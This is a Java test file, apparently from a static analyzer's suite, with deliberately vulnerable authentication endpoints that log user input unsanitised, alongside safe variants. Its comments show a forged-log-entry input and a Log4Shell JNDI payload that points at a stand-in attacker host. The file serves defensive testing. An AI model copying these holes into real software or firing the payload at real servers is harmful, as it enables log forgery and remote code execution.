/*
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */

package codetoanalyze.java.pulse;

import java.util.UUID;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.ws.rs.FormParam;
import javax.ws.rs.GET;
import javax.ws.rs.POST;
import javax.ws.rs.Path;
import javax.ws.rs.PathParam;
import javax.ws.rs.QueryParam;

// An authentication service writing an audit log. A user name such as
// "alice\nINFO: login succeeded for admin" adds a forged entry to the log, which misleads the
// people and the tools reading it.
@Path("/auth")
public class LogInjection {

  private static final Logger LOGGER = Logger.getLogger(LogInjection.class.getName());

  private static final org.slf4j.Logger SLF4J_LOGGER =
      org.slf4j.LoggerFactory.getLogger(LogInjection.class);

  private static final org.apache.logging.log4j.Logger LOG4J_LOGGER =
      org.apache.logging.log4j.LogManager.getLogger(LogInjection.class);

  @POST
  @Path("/login")
  void failedLoginBad(@FormParam("user") String user) {
    LOGGER.warning("login failed for " + user);
  }

  @POST
  @Path("/reset")
  void passwordResetBad(@FormParam("email") String email) {
    LOGGER.log(Level.INFO, "password reset requested for " + email);
  }

  // the parameter is formatted into the message
  @GET
  @Path("/search")
  void searchBad(@QueryParam("query") String query) {
    LOGGER.log(Level.INFO, "user search for {0}", query);
  }

  @POST
  @Path("/lock")
  void lockAccountBad(@FormParam("user") String user) {
    LOGGER.logp(Level.WARNING, "LogInjection", "lockAccount", "account locked: " + user);
  }

  @GET
  @Path("/sessions/{id}")
  void sessionBad(@PathParam("id") String id) {
    LOGGER.info("session " + id + " resumed");
  }

  // SLF4J: the arguments are formatted into the message, without escaping

  @POST
  @Path("/v5/login")
  void failedLoginWithSlf4jBad(@FormParam("user") String user) {
    SLF4J_LOGGER.warn("login failed for {}", user);
  }

  @POST
  @Path("/v5/reset")
  void passwordResetWithSlf4jBad(@FormParam("email") String email) {
    SLF4J_LOGGER.info("password reset requested for " + email);
  }

  @POST
  @Path("/v5/lock")
  void lockAccountWithSlf4jBad(@FormParam("user") String user, @FormParam("reason") String reason) {
    SLF4J_LOGGER.error("account {} locked: {}", user, reason);
  }

  // Log4j 2

  @POST
  @Path("/v6/login")
  void failedLoginWithLog4jBad(@FormParam("user") String user) {
    LOG4J_LOGGER.warn("login failed for {}", user);
  }

  // Before 2.15, Log4j 2 also resolved lookups such as "${jndi:ldap://attacker.example/a}" in the
  // message, which let the client run code on the server (Log4Shell).
  @GET
  @Path("/v6/sessions/{id}")
  void unknownSessionWithLog4jBad(@PathParam("id") String id) {
    LOG4J_LOGGER.error("unknown session " + id);
  }

  // interprocedural

  private static void audit(String event) {
    LOGGER.severe("audit: " + event);
  }

  @POST
  @Path("/logout")
  void logoutViaHelperBad(@FormParam("user") String user) {
    audit("logout of " + user);
  }

  @POST
  @Path("/shutdown")
  void shutdownViaHelperOk() {
    audit("shutdown requested");
  }

  // no user-controlled data in the log

  @POST
  @Path("/v2/login")
  void failedLoginOk(@FormParam("user") String user) {
    LOGGER.warning("login failed");
  }

  @POST
  @Path("/v7/login")
  void failedLoginWithLibrariesOk(@FormParam("user") String user) {
    SLF4J_LOGGER.info("login failed");
    LOG4J_LOGGER.info("login failed");
  }

  // a UUID only contains hexadecimal digits and dashes
  @GET
  @Path("/v2/sessions/{id}")
  void sessionByUuidOk(@PathParam("id") String id) {
    LOGGER.info("session " + UUID.fromString(id) + " resumed");
  }

  // the user name is checked by a validator declared as a sanitizer (see Validators.java)
  @POST
  @Path("/v3/login")
  void failedLoginWithValidatedUserOk(@FormParam("user") String user) {
    LOGGER.warning("login failed for " + Validators.requireAlphanumeric(user));
  }

  // The line breaks are replaced, so the user name cannot start a new entry. Pulse does not know
  // what `replaceAll` removes.
  @POST
  @Path("/v4/login")
  void FP_failedLoginWithoutLineBreaksOk(@FormParam("user") String user) {
    LOGGER.warning("login failed for " + user.replaceAll("[\r\n]", "_"));
  }
}
